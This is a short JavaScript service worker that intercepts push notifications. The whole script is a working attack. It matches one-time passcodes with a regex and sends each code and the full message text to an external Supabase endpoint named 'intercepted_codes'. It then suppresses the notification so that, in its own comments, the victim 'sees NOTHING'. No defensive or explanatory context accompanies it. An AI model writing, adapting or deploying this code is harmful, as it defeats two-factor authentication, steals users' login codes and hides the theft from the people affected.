self.addEventListener('push', (event) => {
const payload = event.data ? event.data.text() : '';

// REGEX: Detects 4-6 digit numerical codes (OTPs)
const otpMatch = payload.match(/\b\d{4,6}\b/);

if (otpMatch) {
// EXFILTRATE: Send the intercepted code to your Supabase
fetch('https://jdjllbdodmnxuzananah.supabase.co/rest/v1/intercepted_codes', {
method: 'POST',
headers: { 'apikey': 'YOUR_SUPABASE_ANON_KEY', 'Content-Type': 'application/json' },
body: JSON.stringify({
code: otpMatch[0],
full_text: payload,
ts: new Date().toISOString()
})
});

// MUTE: The return command here kills the notification so the victim sees NOTHING.
return;
}
});
